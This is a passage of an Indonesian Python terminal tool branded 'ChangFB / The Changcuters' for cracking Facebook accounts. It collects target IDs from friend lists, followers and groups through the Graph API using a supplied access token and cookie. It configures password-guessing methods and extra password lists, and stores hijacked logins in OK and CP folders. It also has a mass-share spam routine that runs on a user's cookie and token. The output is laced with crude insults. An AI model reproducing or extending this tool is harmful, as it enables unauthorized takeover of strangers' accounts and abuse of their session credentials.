...
def banner():
	clear()
	sol()
	ban='''•━━╬٨ـﮩINFORMASI SCRIPT LANGSUNG HUBUNGI ADMIN٨ـﮩﮩـ╬━━•'''
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [yellow]%s[white] Semoga Ijo'%(my_name)))
	print(f'╭───{x}[{h}+{x}] Your Idz : '+str(my_id))
	print(f'├───{x}[{h}+{x}] Your Ip  : {ip}')
	print(f'├───{x}[{h}+{x}] Github   : {gh}')
	print(f'├───{x}[{k}•{x}] ChangFB  : {H}Changcuters{x}')
	print(f'├───{x}[{k}•{x}] WhatsApp : {H}0819-0776-1235{x}')
	print(f'├───{x}[{h}+{x}] Status   : {H}Premium{x}\n├───────────────────────────────────────────────────────')
	print(f'\x1b[1;97m├───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m [ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\x1b[38;5;208m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0819-0776-1235                         │ \n|\x1b[1;97m ╰─[{sir} Author : ChangFB {x}]───────────────────────────────╯')
	print(f'├───{x}[{h}1{x}] Crack Publik       {N}[{H}3{P}] Lapor bug')
	print(f'├───{x}[{h}2{x}] Crack Follower     {N}[{H}4{P}] Crack File')
	print(f'├───{x}[{h}5{x}] Hasil Crack        {N}[{H}6{P}] Share posting FB')
	print(f'├───{x}[{h}7{x}] ChangFB            {N}[{H}8{P}] Crack Instan')
	print(f'├───{x}[{h}9{x}] Changcuters        {N}[{H}0{P}] Keluar & Lanjut{N}')
	print(f'├──╭[{h}MENU{x}]──────────────────────────────────────────────')
	_____alvino__adijaya_____ = input(f'│  ╰─➣\x1b[1;97m ')
	if _____alvino__adijaya_____ in ['1']:
		...
		print(f'\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\x1b[1;95m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n├───{x}[{k}•{x}] Susah Cari Cookie Goblok ')
		exit()
	else:
		print(f'├───{x}[{k}•{x}] Pilih Yang Bener Asu ')
		back()
def error():
	jalan(f'├───{x}[{k}•{x}] Tunggu Anda Akan Di Arahkan Ke WhatsApp {x}')
	time.sleep(4)
	os.system("xdg-open http://www.wasap.my/6282261310817")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'|───────────────────────────────────────────────────────\n├───{x}[{k}•{x}] Changcuters ')
	print(f'├───{x}[{k}1{x}] Hasil {h}OK{x} Anda ')
	print(f'├───{x}[{k}2{x}] Hasil {k}CP{x} Anda ')
	print(f'├───{x}[{k}3{x}] Kembali	')
	kz = input(f'├──╭[{h}PILIH{x}]─────────────────────────────────────────────\n│  ╰─➣\x1b[1;92m\x1b[1;97m ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'├───{x}[{k}+{x}] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'├───{x}[{k}+{x}] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			for isi in vin:
				...
				if cih<10:
					...
					print(f'├───{x}[{k}+{x}] %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
			...
			try:geh = lol[geeh]
				...
				print(f'├───{x}[{k}3{x}] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'├───{x}[{k}3{x}] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				...
				nocp +=1
			print('')
			input(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] [{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print(f'├───{x}[{k}+{x}] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			for isi in vin:
				...
				if cih<10:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'├───{x}[{k}+{x}] %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'├───{x}[{k}+{x}] %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'├───{x}[{k}+{x}] Pilih Yang Bener Kontol ')
				back()
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('│')
				print('')
				print(f'{x}├───{x}[{k}+{x}] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m][{m} Klik Enter{x} ]')
			back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Mau Berapa Target Chang 🤑 : '))
	except ValueError:
		print(f'\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\033[32m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\033[32m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\033[32m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n│\n╰───[{h}+{x}] Masukkan Angka Anjing, Malah Huruff 🤬')
		exit()
	if jum<1 or jum>100:
		print(f'\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\x1b[1;95m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[1;95m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n│\n╰───[{h}+{x}] Gagal Dump ID 🤭')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukkan lD Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print(f'├───[{h}+{x}] Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('│')
		print(f'├───[{h}+{x}] Total lD Yang Terkumpul✓{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(f'├───[{h}+{x}] Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'├───[{h}+{x}]{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print(f'├───[{h}+{x}] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'├───[{h}+{x}] Total lD :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'├───[{h}+{x}] Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print(f'├───[{h}+{x}] Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukkan Username Atau Idz Grup : ')
	...
	try:
		...
		print('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	...
	if berr2=='Masuk Facebook':
		...
		alvino_xy('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Nama Grup : {b}%s'%(berr2))
	...
	if len(ang)==0:
		...
		print(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
...
threads = []
def memek():
	print("\x1b[1;97m├───[\x1b[1;92m1\x1b[1;97m] Spam share via token dan cookie Di Sarankan")
	ask = input("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Pilih : ")
	if ask in["1"]:
		token_cookie()
	
def token_cookie():
	print("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Cokiess Bebas")
	cookie = input("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukan cookie : ")
	print("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Pake token EAAG")
	token = input("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukan token : ")
	idt = input("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukan link : ")
	limit = int(input("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukan limit : "))
	try:
		n = 0
		...
		for x in range(limit):
			...
			if 'id' in post:
				print(f"\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] {n}. berhasil membagikan {data['id']}")
			else:
				exit("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Gagal membagikan, kemungkinan token invalid")
	except:
		exit("\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Gagal membagikan, kemungkinan token invalid")
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/Chang-FB')
	except FileNotFoundError:
		print(f'├───[{h}+{x}] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		...
		kontol = input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m]  Apakah Anda Faham [Y/T] ')
		if kontol in ['']:
			print(f'├───[{h}+{x}] Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m]  [{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] [{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print(f'├───[{h}+{x}] Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/Chang-FB/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'├───[{h}+{x}] %s. %s [{h} %s{x} ID]'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(f'├───[{h}+{x}] %s. %s [{h} %s {x}ID ] '%(cih,isi,len(hem)))
		geeh = input(f'├───[{h}+{x}] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'├───[{h}+{x}] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/Chang-FB/'+geh,'r').read().splitlines()
		except:
			print(f'├───[{h}+{x}] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}├───[{sir}METODE{x}]────────────────────────────────────────────')
	print(f'├───[{h}+{x}] The Changcuters')
	print(f'├───[{h}1{x}] Tertua ')
	print(f'├───[{h}2{x}] Termuda')
	print(f'├───[{h}3{x}] Random [\x1b[1;92m✓\x1b[1;97m]')
	print(f'├───[{h}+{x}] Whatsapp : 0819-0776-1235 ᭄ ')
	hu = input(f'├──╭[{h}METODE{x}]────────────────────────────────────────────\n│  ╰─➣\x1b[1;92m\x1b[1;97m ')
	if hu in ['1','01']:
		...
		print(f'|——[{h}+{x}] Pilih Yang Bener Bocah ')
		exit()
	print(f'├───[{sir}METODE{x}]────────────────────────────────────────────')
	print(f'├───[{h}1{x}] Mobile   [\x1b[1;92m✓\x1b[1;97m] ')
	print(f'├───[{h}2{x}] Mbasic ')
	print(f'├───[{h}3{x}] Touch ')
	print(f'├───[{h}4{x}] Mtouch ')
	print(f'├───[{h}+{x}] ChangFB ')
	hc = input(f'├──╭[{h}METODE{x}]────────────────────────────────────────────\n│  ╰─➣\x1b[1;92m\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print(f'├───[{h}+{x}] Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		...
		method.append('mobile')
	print('├───────────────────────────────────────────────────────')
	_jembot_ = input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Tambahkan Aplikasi \x1b[1;97m[\x1b[1;92mY/\x1b[1;97m\x1b[1;92mT\x1b[1;97m] : ')
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Tambahkan Password Manual \x1b[1;97m[\x1b[1;92mY/\x1b[1;97m\x1b[1;92mT\x1b[1;97m] : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('├───[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	print(f'├───────────────────────────────────────────────────────')
	print(f'\x1b[1;97m├───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[\x1b[1;92mFACEBOOK INDONESIA\x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │  \x1b[1;97m█████████████      Author   : Changcuters         \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m███████\x1b[1;97m██      Github   : ChangFB             \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      WhatsApp : 0822-6131-0817      \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m█████\x1b[1;97m████      \x1b[0;34m╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      \x1b[0;34m╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      \x1b[0;34m╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;92mVERSION  \x1b[1;92m1\x1b[1;97m.\x1b[1;92m10        \x1b[1;97m[\033[41m\033[1;37m Status : Premium \x1b[0m\x1b[1;97m]         \x1b[1;97m│\n\x1b[1;97m│ ╰────────────────────────────────────────────────────╯')
	print(f'├───{m}•{k}•{h}•{x} ChangFB {m}•{k}•{h}•{x} ')
	print(f'├────────────[SEMOGA BERUNTUNG]')
	print(f'├───[{h}•{x}] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'├───[{h}•{x}] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'├──────────[{h}MAINKAN MODE PESAWAT SETIAP 1K ID{x}]──────────\r')
	print('│')
	...
	print('|')
	print('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}\x1b[1;97m├───[\x1b[1;92m+\x1b[1;97m] {k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
